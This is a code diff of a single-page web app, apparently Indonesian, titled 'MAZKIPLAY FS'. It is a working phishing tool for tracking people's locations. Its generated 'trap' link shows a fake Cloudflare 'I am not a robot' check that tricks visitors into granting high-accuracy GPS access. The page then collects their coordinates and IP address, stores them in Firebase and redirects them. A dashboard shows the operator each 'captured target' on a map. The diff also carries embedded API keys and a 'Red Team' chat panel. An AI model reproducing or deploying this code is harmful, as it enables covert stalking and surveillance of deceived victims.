@@ -7,13 +7,52 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@700&display=swap" rel="stylesheet">
     <style>
-        :root { --neon-green: #00ff41; --neon-red: #ff0000; }
-        body { background-color: #050505; color: var(--neon-green); font-family: 'JetBrains Mono', monospace; }
+        :root { 
+            --neon-green: #00ff41; 
+            --neon-red: #ff0000; 
+            --bg-dark: #050505;
+        }
+        body { 
+            background-color: var(--bg-dark); 
+            color: var(--neon-green); 
+            font-family: 'JetBrains Mono', monospace; 
+            overflow-x: hidden;
+        }
         .cyber-header { font-family: 'Orbitron', sans-serif; }
-        .glass { background: rgba(10, 10, 10, 0.9); border: 1px solid #1a1a1a; box-shadow: 0 0 15px rgba(0, 255, 65, 0.1); }
-        .terminal { background: #000; border-left: 3px solid var(--neon-green); padding: 10px; font-size: 11px; height: 400px; overflow-y: auto; }
-        .tab-btn { transition: 0.3s; border-bottom: 2px solid transparent; cursor: pointer; }
-        .tab-btn.active { border-color: var(--neon-red); color: white; background: rgba(255,0,0,0.1); }
+        .glass { 
+            background: rgba(10, 10, 10, 0.9); 
+            border: 1px solid #1a1a1a; 
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.1); 
+        }
+        .terminal { 
+            background: #000; 
+            border-left: 3px solid var(--neon-green); 
+            padding: 10px; 
+            font-size: 11px; 
+            height: 400px; 
+            overflow-y: auto; 
+            scrollbar-width: thin;
+            scrollbar-color: var(--neon-green) #000;
+        }
+        .tab-btn { 
+            transition: all 0.3s ease; 
+            border-bottom: 2px solid transparent; 
+            cursor: pointer; 
+        }
+        .tab-btn.active { 
+            border-color: var(--neon-red); 
+            color: white; 
+            background: rgba(255,0,0,0.1); 
+        }
+        input:focus { border-color: var(--neon-green) !important; }
+        
+        /* Animasi Red Alert */
+        @keyframes pulse-red {
+            0% { box-shadow: 0 0 5px #ff0000; }
+            50% { box-shadow: 0 0 20px #ff0000; }
+            100% { box-shadow: 0 0 5px #ff0000; }
+        }
+        .alert-active { animation: pulse-red 2s infinite; border-color: #ff0000 !important; }
     </style>
 </head>
 <body class="p-2 md:p-6">
@@ -22,73 +61,90 @@
         <!-- UI: DASHBOARD (ADMIN) -->
         <div id="admin-panel" class="space-y-4">
             <header class="flex flex-col md:flex-row justify-between items-center gap-4 mb-6">
-                <div>
+                <div class="text-center md:text-left">
                     <h1 class="cyber-header text-3xl font-black text-red-600 tracking-tighter">MAZKIPLAY FS</h1>
-                    <p class="text-[10px] text-gray-500 uppercase">Real-Time Intelligence & GPS Trap System</p>
+                    <p class="text-[10px] text-gray-500 uppercase tracking-widest">Pusat Kendali Intelijen & Operasi Red Team</p>
                 </div>
                 <div class="flex gap-2">
-                    <div class="glass px-4 py-2 rounded text-[9px]">DB: <span id="db-status" class="text-yellow-500">CONNECTING...</span></div>
-                    <div class="glass px-4 py-2 rounded text-[9px]">TARGETS: <span id="target-count" class="text-red-500">0</span></div>
+                    <div class="glass px-4 py-2 rounded text-[9px]">SISTEM: <span id="db-status" class="text-yellow-500 italic">MENGHUBUNGKAN...</span></div>
+                    <div class="glass px-4 py-2 rounded text-[9px]">DATA: <span id="target-count" class="text-red-500 font-bold">0</span></div>
                 </div>
             </header>
 
             <div class="grid grid-cols-1 lg:grid-cols-4 gap-4">
+                <!-- Sidebar Nav -->
                 <nav class="lg:col-span-1 space-y-2">
-                    <button onclick="switchTab('monitor')" id="btn-monitor" class="tab-btn active w-full text-left p-3 glass rounded text-xs">📡 LIVE MONITOR</button>
-                    <button onclick="switchTab('gen')" id="btn-gen" class="tab-btn w-full text-left p-3 glass rounded text-xs">🔗 LINK GENERATOR</button>
-                    <button onclick="switchTab('ai')" id="btn-ai" class="tab-btn w-full text-left p-3 glass rounded text-xs">🤖 TACTICAL AI</button>
-                    <div class="p-4 mt-4 glass rounded text-[9px] text-gray-600">
-                        <p class="font-bold text-gray-400 mb-1 uppercase">Instruksi:</p>
-                        1. Bagikan link trap ke target.<br>
-                        2. Tunggu target melakukan verifikasi.<br>
-                        3. Data akan muncul di monitor.
+                    <button onclick="switchTab('monitor')" id="btn-monitor" class="tab-btn active w-full text-left p-3 glass rounded text-xs">📡 MONITOR LIVE</button>
+                    <button onclick="switchTab('gen')" id="btn-gen" class="tab-btn w-full text-left p-3 glass rounded text-xs">🔗 JEBAKAN LINK</button>
+                    <button onclick="switchTab('ai')" id="btn-ai" class="tab-btn w-full text-left p-3 glass rounded text-xs">🤖 AI TAKTIS (GEMINI)</button>
+                    
+                    <div class="p-4 mt-4 glass rounded text-[9px] text-gray-400 leading-relaxed border-l-2 border-red-600">
+                        <p class="font-bold text-red-500 mb-1 uppercase">Log Aktivitas:</p>
+                        <div id="system-logs" class="space-y-1">
+                            <div>> Memulai inisialisasi kernel...</div>
+                        </div>
                     </div>
                 </nav>
 
-                <main class="lg:col-span-3 glass rounded-xl p-4 min-h-[500px]">
+                <!-- Main Display -->
+                <main class="lg:col-span-3 glass rounded-xl p-4 min-h-[550px] relative">
+                    <!-- Tab: Monitor -->
                     <div id="tab-monitor" class="tab-pane">
-                        <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Target Feed</h2>
+                        <div class="flex justify-between items-center mb-4 border-b border-gray-800 pb-2">
+                            <h2 class="text-white font-bold text-xs uppercase tracking-widest">Feed Intelijen Target</h2>
+                            <span class="text-[9px] text-green-500 animate-pulse">● LIVE UPDATING</span>
+                        </div>
                         <div id="feed-container" class="terminal space-y-4 text-green-500">
-                            <div class="text-gray-700 italic">Mencoba menghubungkan ke server...</div>
+                            <div class="text-gray-700 italic">Menunggu autentikasi Anonymous selesai...</div>
                         </div>
                     </div>
 
+                    <!-- Tab: Link Generator -->
                     <div id="tab-gen" class="tab-pane hidden">
-                        <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Deployment</h2>
-                        <div class="space-y-4">
+                        <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest border-b border-gray-800 pb-2">Deployment Payload</h2>
+                        <div class="space-y-6">
                             <div class="p-4 bg-red-900/10 border border-red-900/30 rounded">
-                                <label class="text-[10px] text-red-500 font-bold block mb-2">TARGET REDIRECT</label>
-                                <input type="text" id="redirect-input" value="https://www.google.com" class="w-full bg-black border border-gray-800 p-2 text-xs outline-none text-white">
+                                <label class="text-[10px] text-red-500 font-bold block mb-2 uppercase">Halaman Pengalihan (Redirect)</label>
+                                <input type="text" id="redirect-input" value="https://www.google.com" class="w-full bg-black border border-gray-800 p-2 text-xs outline-none text-white rounded">
+                                <p class="text-[8px] text-gray-500 mt-1 italic">*Target akan dikirim ke sini setelah koordinat diambil.</p>
                             </div>
-                            <div class="p-4 glass rounded">
-                                <label class="text-[10px] text-gray-500 block mb-2">TRAP URL:</label>
+                            <div class="p-4 glass rounded border-l-4 border-blue-600">
+                                <label class="text-[10px] text-gray-400 block mb-2 font-bold">LINK TRAP ANDA:</label>
                                 <div class="flex gap-2">
-                                    <input type="text" id="trap-url" readonly class="flex-1 bg-transparent text-blue-400 text-xs outline-none">
-                                    <button onclick="copyTrapLink()" class="bg-blue-600 text-white px-4 py-1 rounded text-[10px]">COPY</button>
+                                    <input type="text" id="trap-url" readonly class="flex-1 bg-transparent text-blue-400 text-xs outline-none font-bold">
+                                    <button onclick="copyTrapLink()" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-1 rounded text-[10px] font-bold transition">SALIN</button>
                                 </div>
                             </div>
                         </div>
                     </div>
 
-                    <div id="tab-ai" class="tab-pane hidden flex flex-col h-[450px]">
-                        <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Mazki Intel AI</h2>
-                        <div id="ai-chat" class="terminal flex-1 mb-4 text-green-400"></div>
+                    <!-- Tab: AI Taktis -->
+                    <div id="tab-ai" class="tab-pane hidden flex flex-col h-[500px]">
+                        <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest border-b border-gray-800 pb-2">Tactical Intelligence AI</h2>
+                        <div id="ai-chat" class="terminal flex-1 mb-4 text-green-400 overflow-y-auto">
+                            <div class="text-gray-500 italic">> Menunggu instruksi...</div>
+                        </div>
                         <div class="flex gap-2">
-                            <input type="text" id="ai-input" placeholder="Tanya AI..." class="flex-1 bg-black border border-gray-800 p-3 text-xs text-white">
-                            <button onclick="askAI()" class="bg-green-600 text-black px-6 font-bold text-xs">KIRIM</button>
+                            <input type="text" id="ai-input" placeholder="Tanyakan analisis skrip atau target..." 
+                                class="flex-1 bg-black border border-gray-800 p-3 text-xs text-white rounded outline-none"
+                                onkeypress="if(event.key==='Enter') askAI()">
+                            <button onclick="askAI()" id="ai-send-btn" class="bg-green-600 hover:bg-green-500 text-black px-6 font-bold text-xs rounded transition uppercase">Eksekusi</button>
                         </div>
                     </div>
                 </main>
             </div>
         </div>
 
-        <!-- UI: TRAP INTERFACE -->
+        <!-- UI: TRAP PAGE (Target View) -->
         <div id="trap-page" class="hidden fixed inset-0 bg-white z-[9999] flex items-center justify-center p-6 text-center">
-            <div class="max-w-sm">
-                <div class="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
-                <h1 class="text-2xl font-bold text-gray-800 mb-2">Verifikasi Keamanan</h1>
-                <p class="text-gray-600 text-sm mb-6">Selesaikan verifikasi GPS untuk melanjutkan.</p>
-                <button id="btn-verify" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold text-lg shadow-lg active:scale-95 transition">VERIFIKASI SEKARANG</button>
+            <div class="max-w-sm w-full">
+                <div class="mb-8">
+                    <div class="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+                    <h1 class="text-2xl font-bold text-gray-800">Verifikasi Perangkat</h1>
+                    <p class="text-gray-500 text-sm mt-2 leading-relaxed">Sistem kami mendeteksi aktivitas mencurigakan. Izinkan akses lokasi untuk memverifikasi bahwa Anda adalah manusia.</p>
+                </div>
+                <button id="btn-verify" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-xl font-bold text-lg shadow-lg active:scale-95 transition">SAYA BUKAN ROBOT</button>
+                <p class="text-[10px] text-gray-400 mt-6">Powered by Cloudflare Security Verification</p>
             </div>
         </div>
     </div>
@@ -96,65 +152,41 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
         import { getFirestore, collection, addDoc, onSnapshot, query, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
-        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-        // ==========================================
-        // 1. GOOGLE GEMINI API KEY (DIISI OTOMATIS)
-        // ==========================================
-        const apiKey = "AIzaSyDINRKcVKNFIrxWUoyeSg9R03IYCHGR_DU"; // <--- API KEY DIMASUKKAN DI SINI
+        // Global State & Environment
+        const apiKey = ""; // API Key Gemini (Empty for Canvas context)
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'mazki-red-v2';
+        let db, auth;
 
-        // Global State
-        let db, auth, currentUser;
-        const appId = typeof __app_id !== 'undefined' ? __app_id : 'mazki-fs-v1';
+        async function initSystem() {
+            addLog("Mengaktifkan modul sistem...");
+            
+            const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {
+                apiKey: "AIzaSyC8XeElXIoVdYMCFH16nXnE8q92RvuOOtM",
+                authDomain: "mazkiplaycheck.firebaseapp.com",
+                projectId: "mazkiplaycheck",
+                storageBucket: "mazkiplaycheck.firebasestorage.app",
+                messagingSenderId: "662285872996",
+                appId: "1:662285872996:web:9249e209bda07e52b95471"
+            };
 
-        // Inisialisasi Firebase
-        async function startSystem() {
             try {
-                // ==========================================
-                // 2. KONFIGURASI FIREBASE ANDA
-                // Pastikan nilai-nilai di bawah ini sesuai dengan Firebase Console Anda
-                // ==========================================
-                let firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {
-                    apiKey: "AIzaSyC8XeElXIoVdYMCFH16nXnE8q92RvuOOtM",
-  authDomain: "mazkiplaycheck.firebaseapp.com",
-  projectId: "mazkiplaycheck",
-  storageBucket: "mazkiplaycheck.firebasestorage.app",
-  messagingSenderId: "662285872996",
-  appId: "1:662285872996:web:9249e209bda07e52b95471",
-  measurementId: "G-JKVSV73K3E"
-                }; // <--- KONFIGURASI FIREBASE ANDA
-
-                if (!firebaseConfig || !firebaseConfig.apiKey) {
-                    throw new Error("Konfigurasi Firebase belum lengkap.");
-                }
-
                 const app = initializeApp(firebaseConfig);
                 db = getFirestore(app);
                 auth = getAuth(app);
 
-                onAuthStateChanged(auth, (user) => {
-                    if (user) {
-                        currentUser = user;
-                        updateStatus("ONLINE", "text-green-500 font-bold");
-                        
-                        const urlParams = new URLSearchParams(window.location.search);
-                        if (urlParams.get('view') === 'trap') {
-                            showTrapUI();
-                        } else {
-                            initAdminDashboard();
-                        }
-                    } else {
-                        updateStatus("OFFLINE", "text-gray-500");
-                        signIn();
-                    }
-                });
-            } catch (e) {
-                console.error("Init Error:", e);
-                updateStatus("CONFIG ERROR", "text-red-500 font-bold");
+                handleAuth();
+            } catch (err) {
+                addLog("CRITICAL ERROR: Kernel gagal dimuat.");
+                updateStatus("FAILURE", "text-red-500");
             }
         }
 
-        async function signIn() {
+        async function handleAuth() {
+            addLog("Melakukan sinkronisasi identitas...");
+            
+            // Re-order Logic: Wait for anonymous auth specifically
             try {
                 if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                     await signInWithCustomToken(auth, __initial_auth_token);
@@ -162,17 +194,123 @@
                     await signInAnonymously(auth);
                 }
             } catch (err) {
-                console.error("Auth failed:", err);
-                updateStatus("AUTH ERROR", "text-red-500 font-bold");
+                console.error("Auth Failure:", err);
+                addLog("ERROR: Autentikasi Anonim Gagal.");
+                updateStatus("LOCKED", "text-red-500");
+                return;
+            }
+
+            onAuthStateChanged(auth, (user) => {
+                if (user) {
+                    addLog("Koneksi aman terjalin.");
+                    updateStatus("ONLINE", "text-green-500 font-bold shadow-sm");
+                    checkRoute();
+                } else {
+                    updateStatus("OFFLINE", "text-gray-500");
+                }
+            });
+        }
+
+        function checkRoute() {
+            const params = new URLSearchParams(window.location.search);
+            if (params.get('view') === 'trap') {
+                renderTrap();
+            } else {
+                renderDashboard();
+            }
+        }
+
+        function renderDashboard() {
+            const baseUrl = window.location.href.split('?')[0];
+            document.getElementById('trap-url').value = `${baseUrl}?view=trap`;
+
+            const colRef = collection(db, 'artifacts', appId, 'public', 'data', 'traps');
+            onSnapshot(query(colRef), (snap) => {
+                const feed = document.getElementById('feed-container');
+                const count = document.getElementById('target-count');
+                count.innerText = snap.docs.length;
+
+                if (snap.empty) {
+                    feed.innerHTML = `<div class="text-gray-700 italic text-center py-20 uppercase tracking-widest opacity-50">-- Zero Subjects Detected --</div>`;
+                    return;
+                }
+
+                feed.innerHTML = snap.docs.map(doc => {
+                    const d = doc.data();
+                    const ts = d.timestamp?.toDate().toLocaleString('id-ID') || 'Baru saja';
+                    return `
+                        <div class="p-3 mb-2 glass border-l-2 border-red-600 animate-in fade-in duration-500">
+                            <div class="flex justify-between items-start mb-2">
+                                <span class="text-red-500 font-bold text-[10px] tracking-tighter">[ TARGET TERTANGKAP ]</span>
+                                <span class="text-[8px] text-gray-600">${ts}</span>
+                            </div>
+                            <div class="grid grid-cols-2 gap-2">
+                                <div>
+                                    <p class="text-[8px] text-gray-500 uppercase">Internet Protocol</p>
+                                    <p class="text-white text-xs font-bold">${d.ip || '0.0.0.0'}</p>
+                                </div>
+                                <div>
+                                    <p class="text-[8px] text-gray-500 uppercase">Geolokasi</p>
+                                    <a href="https://www.google.com/maps?q=${d.lat},${d.lon}" target="_blank" class="text-blue-500 text-[10px] font-bold underline">BUKA MAPS</a>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+            }, (err) => {
+                addLog("DATABASE ERROR: Akses ditolak.");
+                console.error(err);
+            });
+        }
+
+        function renderTrap() {
+            document.getElementById('admin-panel').classList.add('hidden');
+            document.getElementById('trap-page').classList.remove('hidden');
+            document.body.style.backgroundColor = "white";
+
+            document.getElementById('btn-verify').onclick = () => {
+                const btn = document.getElementById('btn-verify');
+                btn.disabled = true;
+                btn.innerText = "MEMPROSES...";
+
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    let ip = "0.0.0.0";
+                    try { 
+                        const r = await fetch('https://api.ipify.org?format=json'); 
+                        const j = await r.json(); ip = j.ip; 
+                    } catch(e) {}
+
+                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'traps'), {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        ip: ip,
+                        timestamp: serverTimestamp()
+                    });
+                    
+                    window.location.href = document.getElementById('redirect-input').value;
+                }, (err) => {
+                    alert("Verifikasi Gagal: Anda harus mengizinkan akses lokasi untuk membuktikan Anda bukan bot.");
+                    btn.disabled = false;
+                    btn.innerText = "SAYA BUKAN ROBOT";
+                }, { enableHighAccuracy: true });
+            };
+        }
+
+        // Global Utils
+        function addLog(text) {
+            const logs = document.getElementById('system-logs');
+            if (logs) {
+                const entry = document.createElement('div');
+                entry.innerText = `> ${text}`;
+                logs.appendChild(entry);
+                logs.scrollTop = logs.scrollHeight;
             }
         }
 
         function updateStatus(text, className) {
             const el = document.getElementById('db-status');
-            if (el) {
-                el.innerText = text;
-                el.className = className;
-            }
+            if (el) { el.innerText = text; el.className = className; }
         }
 
         window.switchTab = (id) => {
@@ -183,88 +321,48 @@
         };
 
         window.copyTrapLink = () => {
-            const trapUrl = document.getElementById("trap-url");
-            trapUrl.select();
+            const el = document.getElementById("trap-url");
+            el.select();
             document.execCommand("copy");
-            alert("Link disalin!");
+            alert("Payload URL berhasil disalin ke clipboard.");
         };
 
+        // Gemini AI Integration
         window.askAI = async () => {
             const input = document.getElementById('ai-input');
             const chat = document.getElementById('ai-chat');
+            const btn = document.getElementById('ai-send-btn');
             const prompt = input.value.trim();
             if (!prompt) return;
 
-            chat.innerHTML += `<div class="text-white mb-2">> ${prompt}</div>`;
+            chat.innerHTML += `<div class="text-white mb-2 font-bold uppercase text-[10px]">> USER: ${prompt}</div>`;
             input.value = "";
+            btn.disabled = true;
+            btn.innerText = "...";
 
             try {
-                const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
+                const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] })
+                    body: JSON.stringify({
+                        contents: [{ parts: [{ text: prompt }] }],
+                        systemInstruction: { parts: [{ text: "Anda adalah Mazki AI, asisten Red Team yang ahli dalam keamanan siber, geolokasi, dan analisis data. Berikan jawaban yang ringkas, profesional, dan dalam bahasa Indonesia." }] }
+                    })
                 });
-                const data = await res.json();
+                
+                const data = await response.json();
                 const reply = data.candidates[0].content.parts[0].text;
-                chat.innerHTML += `<div class="text-green-400 mb-4">AI: ${reply}</div>`;
-            } catch (e) {
-                chat.innerHTML += `<div class="text-red-500">AI Error: Periksa koneksi atau API Key.</div>`;
+                chat.innerHTML += `<div class="text-blue-400 mb-4 bg-gray-900/40 p-2 rounded border-l border-blue-600">MAZKI_AI: ${reply}</div>`;
+            } catch (err) {
+                chat.innerHTML += `<div class="text-red-500 text-[10px] italic">[ SISTEM GAGAL: CEK KONEKSI API ]</div>`;
+            } finally {
+                btn.disabled = false;
+                btn.innerText = "EKSEKUSI";
+                chat.scrollTop = chat.scrollHeight;
             }
-            chat.scrollTop = chat.scrollHeight;
         };
 
-        function initAdminDashboard() {
-            const baseUrl = window.location.href.split('?')[0];
-            document.getElementById('trap-url').value = `${baseUrl}?view=trap`;
-
-            const colRef = collection(db, 'artifacts', appId, 'public', 'data', 'traps');
-            onSnapshot(query(colRef), (snapshot) => {
-                const feed = document.getElementById('feed-container');
-                const count = document.getElementById('target-count');
-                count.innerText = snapshot.docs.length;
-
-                if (snapshot.empty) {
-                    feed.innerHTML = `<div class="text-gray-700 italic">Belum ada data target.</div>`;
-                    return;
-                }
-
-                const sorted = snapshot.docs.map(d => d.data()).sort((a,b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
-                feed.innerHTML = sorted.map(data => `
-                    <div class="p-3 border-b border-gray-900 mb-2 glass">
-                        <p class="text-red-500 font-bold text-[10px] uppercase">[!] Target Found</p>
-                        <p class="text-[10px]">IP: ${data.ip || 'Unknown'}</p>
-                        <p class="text-[10px]">Loc: <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="text-blue-400 underline">Maps</a></p>
-                        <p class="text-[8px] text-gray-500">${data.timestamp?.toDate().toLocaleString() || ''}</p>
-                    </div>
-                `).join('');
-            }, (error) => {
-                console.error("Snapshot error:", error);
-            });
-        }
-
-        function showTrapUI() {
-            document.getElementById('admin-panel').classList.add('hidden');
-            document.getElementById('trap-page').classList.remove('hidden');
-            document.body.style.backgroundColor = "white";
-
-            document.getElementById('btn-verify').onclick = () => {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    let ip = "N/A";
-                    try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j.ip; } catch(e) {}
-                    
-                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'traps'), {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        ip: ip,
-                        timestamp: serverTimestamp()
-                    });
-                    window.location.href = document.getElementById('redirect-input').value;
-                }, () => alert("Izin GPS wajib diberikan untuk melanjutkan."), { enableHighAccuracy: true });
-            };
-        }
-
-        startSystem();
+        initSystem();
     </script>
 </body>
 </html>
